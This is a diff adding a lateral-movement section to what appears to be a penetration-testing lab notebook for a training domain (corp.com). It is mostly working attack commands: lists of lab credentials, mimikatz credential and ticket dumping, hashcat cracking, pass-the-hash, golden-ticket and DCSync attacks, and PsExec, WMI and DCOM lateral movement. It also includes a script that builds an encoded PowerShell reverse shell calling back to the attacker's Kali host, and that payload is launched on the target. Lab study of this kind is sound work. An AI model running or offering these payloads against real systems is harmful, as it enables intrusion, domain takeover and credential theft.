@@ -4536,6 +4536,161 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
   - RDP to DC1 as 'backupser'  
     `rdesktop -u backupuser -p DonovanJadeKnight1 -d corp.com -g 1280x860 -r disk:share=/home/kali/share 192.168.158.70`  
 
+### Lateral movement in active directory  
+**credentials**
+jen:Nexus123!  
+jeff:Nexus123! (admin)  
+jeffadmin:BrouhahaTungPerorateBroom2023! (DC1)
+dave: (privilege on web04)  
+offsec:lab (admin)  
+
+**RDP**
+`xfreerdp3 /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.158.75 /cert:ignore /drive:share,/home/kali/share`  
+`xfreerdp3 /u:offsec /p:lab /v:192.168.158.74 /cert:ignore /drive:share,/home/kali/share`  (local admin without 'd')  
+`rdesktop -u backupuser -p DonovanJadeKnight1 -d corp.com -g 1280x860 -r disk:share=/home/kali/share 192.168.158.70`  
+
+**PowerView.ps1 (admin PS)**
+`PS C:\Tools> powershell -ep bypass`  
+`PS C:\Tools> Import-Module .\PowerView.ps1'  
+'PS C:\Tools> Get-NetUser | select cn`  
+
+**mimikatz.exe (admin PS)**  
+`mimikatz # privilege::debug`  
+`mimikatz # sekurlsa::tickets` //lists kereros tickets in memory  
+
+**obtain hash**
+`mimikatz # sekurlsa::logonpasswords`  //Dumps cleartext passwords, NTLM hashes, and Kerberos tickets  
+`mimikatz # lsadump::sam` //Dumps local SAM database hashes (requires SYSTEM)  
+`mimikatz # lsadump::lsa /patch`  //Dumps cached domain credentials (Administrator, krbtgt, etc)  
+
+**Hashcat - crack the hash**   
+`kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  
+
+**Attack**
+`mimikatz # sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:NTLMHASH /run:cmd.exe`  //Pass-the-Hash  
+`mimikatz # kerberos::golden /user:USERNAME /domain:DOMAIN /sid:<domain SID> /krbtgt:<krbtgt hash> /id:500 /ptt`  //golden-ticket  
+`mimikatz # lsadump::dcsync /domain:corp.com /user:<Administrator/krbtgt>` //Requests replication from a DC, extracts NTLM hashes directly without dumping ntds.dit  
+
+**lateral movement**  
+`PS C:\Tools\SysinternalsSuite> .\PsExec64.exe -i  \\web04 -u corp\jen -p Nexus123! cmd` //normal user to standalone machine web04  
+`PS C:\tools\SysinternalsSuite> .\PsExec.exe \\web04 cmd` //normal user to standalone machine web04  
+`kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.127.72`  //admin user to standalone machine web04  
+
+- WMI and WinRM
+  - **jeff**:client74 --> web04
+    `xfreerdp3 /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.158.74 /cert:ignore /drive:share,/home/kali/share`  
+  - create encode payload.py in kali
+    nano encode.py  //kali IP 
+    ```
+    import sys
+    import base64
+
+    payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.223",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName  System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte =  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' 
+
+    cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+    print(cmd)
+
+    output>
+    powershell -nop -w hidden -e  JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgAzACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
+    ```
+  - create netcat listener 443 in kali
+  - Executing the WMI payload with base64 reverse shell in target user's PowerShell
+    ```
+    PS C:\Users\jeff> $username = 'jen';
+    PS C:\Users\jeff> $password = 'Nexus123!';
+    PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+    PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+
+    PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
+    PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.158.72 -Credential $credential -SessionOption $Options   //target IP of web04
+
+    PS C:\Users\jeff> $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgAzACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=';
+
+    PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+    ```
+  - Successfully triggered a reverse shell from the victim 192.168.158.72 to your Kali 192.168.45.223
+    ```
+    └─$ nc -lvnp 443
+    listening on [any] 443 ...
+    connect to [192.168.45.223] from (UNKNOWN) [192.168.158.72] 56987
+    hostname
+    web04
+    PS C:\Windows\system32> 
+    ```
+- PsExec  
+  - **offsec(admin)**:client74 --> web04
+    `xfreerdp3 /u:offsec /p:lab /v:192.168.158.74 /cert:ignore /drive:share,/home/kali/share` (avoid using (d) for RDP as the user has local admin)  
+  - Using PsExec laterally move to another host (web04) and open a remote cmd.exe
+    `PS C:\Tools\SysinternalsSuite> .\PsExec64.exe -i  \\web04 -u corp\jen -p Nexus123! cmd`  
+- Pass the Hash
+  - **Administrator** move laterally to web04 from kali (stolen hash)
+    `kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.127.72`  
+- Overpass the Hash
+  - **jeff**:client76 --> web04
+    `xfreerdp3 /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.127.76 /cert:ignore /drive:share,/home/kali/share`  
+  - run a process as **jen:Nexus123!** (Shift right click run as different user)  
+  - dump logon password  
+    `C:\tools>.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > samdump.txt`
+  - Connect to CLIENT76 as **'offsec' (admin)**
+    `xfreerdp3 /u:offsec /p:lab /v:192.168.127.76 /cert:ignore /drive:share,/home/kali/share`  
+  - Inject NTLM hash (**jen**) into a fake logon session (OverPass-the-Hash)
+    `C:\tools>.\mimikatz.exe "sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell" exit`  
+  - Map network resource access web04  
+    `PS C:\Windows\system32> net use \\web04`
+  - Check Kerberos tickets
+    `PS C:\Windows\system32> klist`  
+  - Using PsExec to access web04
+    `PS C:\tools\SysinternalsSuite> .\PsExec.exe \\web04 cmd`  
+- Pass the ticekts
+  - **jen**:client76 --> web04
+    `xfreerdp3 /u:jen /d:corp.com /p:Nexus123! /v:192.168.127.76 /cert:ignore /drive:share,/home/kali/share`
+  - exporting Kerberos tickets  
+    `C:\tools>.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit`  
+  - listing all Kerberos ticket files  
+    `PS C:\Tools> dir *.kirbi`  
+  - injecting a Kerberos ticket into your current session to authenticate as the user in the ticket without needing a password
+    `mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi`
+  - `PS C:\Tools> type ls \\web04\backup\flag.txt`
+- DCOM
+  - **jen**:client74 --> web04  
+    `xfreerdp3 /u:jen /d:corp.com /p:Nexus123! /v:192.168.127.74 /cert:ignore /drive:share,/home/kali/share`
+  - Create a remote COM object on the target web04 From an elevated PowerShell prompt
+    `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.127.72"))`  
+  - Execute a command (calc.exe) via the remote COM object (Demonstrates that code execution is possible on the remote host via the DCOM object)  
+    `$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")`
+  - Execute a PowerShell payload (encoded). Spawn a reverse shell back to your Kali listener (nc -lnvp 443)
+    ```
+    $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgAzACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=","7")
+    ```
+  - remote shell on the target machine connect back to Kali
+    `kali@kali:~$ nc -lnvp 443`  
+- Golden ticket
+  - access to DC1  
+  - RDP to DC1 as **jeffadmin**  
+    `xfreerdp3 /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.127.70 /cert:ignore /drive:share,/home/kali/share`  
+  - Obtain the krbtgt NTLM hash
+    ```
+    mimikatz # privilege::debug
+    mimikatz # lsadump::lsa /patch
+    ```
+  - Move back to client74 as **jen**  
+    `xfreerdp3 /u:jen /d:corp.com /p:Nexus123! /v:192.168.127.74 /cert:ignore /drive:share,/home/kali/share`  
+  - Purge existing Kerberos tickets  
+    `mimikatz # kerberos::purge`
+  - Create a forged TGT (Golden Ticket)
+    `mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt`  
+  - Access resources across the domain (Golden Tickets don’t expire until krbtgt password is reset)  
+    `C:\Tools\SysinternalsSuite>.\PsExec.exe \\dc1 cmd.exe`  
+- dcsync to DC1
+  - RDP to DC1 as jeffadmin
+    `xfreerdp3 /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.127.70 /cert:ignore /drive:share,/home/kali/share`  
+  - perform a dcsync attack to obtain the credentials of Administrator
+    `mimikatz # lsadump::dcsync /user:corp\Administrator`  
+  - Crack the NTLM hash
+    `kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
+  - gain access to DC1 from the cracked credential
+    `rdesktop -u Administrator  -p lab -d corp.com -g 1280x860 -r disk:share=/home/kali/share 192.168.127.70`  
+
 ## Penetration testing report 
 - note editor:
   - [Sublime-syntax highlight](https://www.sublimetext.com/download)
